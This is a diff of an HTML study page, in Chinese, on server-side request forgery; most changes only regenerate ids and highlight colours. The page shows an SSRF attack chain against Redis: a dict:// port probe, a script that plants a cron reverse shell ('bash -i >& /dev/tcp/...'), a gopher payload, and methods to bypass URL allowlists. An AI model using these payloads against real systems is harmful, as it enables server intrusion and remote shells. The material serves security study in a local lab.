@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-09-12 Mon 22:22 -->
+<!-- 2022-09-30 Fri 20:57 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SSRF</title>
@@ -36,9 +36,9 @@
 <header>
 <h1 class="title">SSRF</h1>
 </header>
-<div id="outline-container-org939c544" class="outline-2">
-<h2 id="org939c544">服务器端请求伪造</h2>
-<div class="outline-text-2" id="text-org939c544">
+<div id="outline-container-orga539d7c" class="outline-2">
+<h2 id="orga539d7c">服务器端请求伪造</h2>
+<div class="outline-text-2" id="text-orga539d7c">
 <p>
 Server-Side Request Forgery：服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回数据<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>。
 </p>
@@ -52,7 +52,7 @@ Server-Side Request Forgery：服务器端请求伪造，是一种由攻击者�
 </p>
 
 
-<figure id="org12ddd66">
+<figure id="orgb71172f">
 <img src="../images/ssrf_img1.png" alt="ssrf_img1.png">
 
 </figure>
@@ -128,9 +128,9 @@ if (isset($_POST['url'])){
 </ul>
 </div>
 
-<div id="outline-container-org3bd5e64" class="outline-3">
-<h3 id="org3bd5e64">攻击 <a href="20220730-redis.html#ID-0f357c15-ef76-4958-857d-fc30339c5f9c">Redis</a> <sup><a id="fnr.2.100" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></h3>
-<div class="outline-text-3" id="text-org3bd5e64">
+<div id="outline-container-org919a30a" class="outline-3">
+<h3 id="org919a30a">攻击 <a href="20220730-redis.html#ID-0f357c15-ef76-4958-857d-fc30339c5f9c">Redis</a> <sup><a id="fnr.2.100" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></h3>
+<div class="outline-text-3" id="text-org919a30a">
 <div class="org-src-container">
 <pre class="src src-php">&lt;?php
 # ssrf.php
@@ -145,16 +145,16 @@ curl_close($ch); //关闭 cURL 资源，并且释放系统资源
 </pre>
 </div>
 <div class="org-src-container">
-<pre class="src src-html">&lt;<span style="color: #006699;">html</span>&gt;
-&lt;<span style="color: #006699;">head</span>&gt;
-    &lt;<span style="color: #006699;">title</span>&gt;<span style="color: #000000; font-weight: bold; text-decoration: underline;">post.php</span>&lt;/<span style="color: #006699;">title</span>&gt;
-&lt;/<span style="color: #006699;">head</span>&gt;
-&lt;<span style="color: #006699;">body</span>&gt;
-    &lt;<span style="color: #0000FF;">?php</span>
+<pre class="src src-html"><span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">html</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">head</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+    <span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">title</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>post.php<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">title</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">head</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">body</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+    <span style="color: #333333; background-color: #FFFFFF;">&lt;</span>?php
     echo $_REQUEST[cmd];
-    ?&gt;
-&lt;/<span style="color: #006699;">body</span>&gt;
-&lt;/<span style="color: #006699;">html</span>&gt;
+    ?<span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">body</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">html</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
 </pre>
 </div>
 
@@ -162,7 +162,7 @@ curl_close($ch); //关闭 cURL 资源，并且释放系统资源
 <a href="20220708-network_protocol.html#ID-6d4b32fe-0963-4fd0-9e79-a09905dced7b">dict</a> 探测端口：
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #6434A3;">curl</span> -v -H <span style="color: #008000;">'host:one.php.local'</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'</span>
+<pre class="src src-bash"><span style="color: #006DAF;">curl</span> <span style="color: #D0372D;">-v</span> <span style="color: #D0372D;">-H</span> <span style="color: #008000;">'host:one.php.local'</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'</span>
 </pre>
 </div>
 <p>
@@ -174,12 +174,12 @@ Invalid SSH identification string.
 exp(linux):
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #6434A3;">echo</span> -e <span style="color: #008000;">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"</span>|redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> -x set <span style="color: #D0372D;">1</span>
-redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> config set dir /var/spool/cron/
-redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> config set dbfilename root
-redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> save
-redis-cli -h $<span style="color: #D0372D;">1</span> -p $<span style="color: #D0372D;">2</span> quit
-bash shell.sh 127.0.0.1 <span style="color: #D0372D;">6379</span>
+<pre class="src src-bash"><span style="color: #006FE0;">echo</span> <span style="color: #D0372D;">-e</span> <span style="color: #008000;">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"</span><span style="color: #0000FF;">|</span><span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> <span style="color: #D0372D;">-x</span> set <span style="color: #D0372D;">1</span>
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> config set dir /var/spool/cron/
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> config set dbfilename root
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> save
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> quit
+<span style="color: #006DAF;">bash</span> shell.sh 127.0.0.1 <span style="color: #D0372D;">6379</span>
 </pre>
 </div>
 
@@ -195,29 +195,29 @@ bash shell.sh 127.0.0.1 <span style="color: #D0372D;">6379</span>
 再利用 <a href="20220708-network_protocol.html#ID-a58133b5-ab13-4e15-992a-dcdd8b5c0fd2">gopher</a> 协议 payload<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup> 反弹 shell:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #6434A3;">curl</span> -v <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...'</span> -H <span style="color: #008000;">'host: one.php.local'</span>
+<pre class="src src-bash"><span style="color: #006DAF;">curl</span> <span style="color: #D0372D;">-v</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...'</span> <span style="color: #D0372D;">-H</span> <span style="color: #008000;">'host: one.php.local'</span>
 </pre>
 </div>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org5a77f44" class="outline-2">
-<h2 id="org5a77f44">SSRF 漏洞</h2>
-<div class="outline-text-2" id="text-org5a77f44">
+<div id="outline-container-org0ca2a70" class="outline-2">
+<h2 id="org0ca2a70">SSRF 漏洞</h2>
+<div class="outline-text-2" id="text-org0ca2a70">
 </div>
 <div id="outline-container-ID-9d72a111-0aa4-4f3b-948c-b9681c8367d6" class="outline-3">
 <h3 id="ID-9d72a111-0aa4-4f3b-948c-b9681c8367d6">Weblogic CVE-2014-4210 <sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup></h3>
 <div class="outline-text-3" id="text-ID-9d72a111-0aa4-4f3b-948c-b9681c8367d6">
 </div>
 </div>
-<div id="outline-container-orgb74e43a" class="outline-3">
-<h3 id="orgb74e43a">Discuz 3.4X SSRF</h3>
+<div id="outline-container-org60c5144" class="outline-3">
+<h3 id="org60c5144">Discuz 3.4X SSRF</h3>
 </div>
 </div>
-<div id="outline-container-org57475d2" class="outline-2">
-<h2 id="org57475d2">绕过 URL 白名单或禁内网 IP 地址</h2>
-<div class="outline-text-2" id="text-org57475d2">
+<div id="outline-container-orgedb177f" class="outline-2">
+<h2 id="orgedb177f">绕过 URL 白名单或禁内网 IP 地址</h2>
+<div class="outline-text-2" id="text-orgedb177f">
 <ul class="org-ul">
 <li>@</li>
 <li>IP 地址转换为其他进制</li>
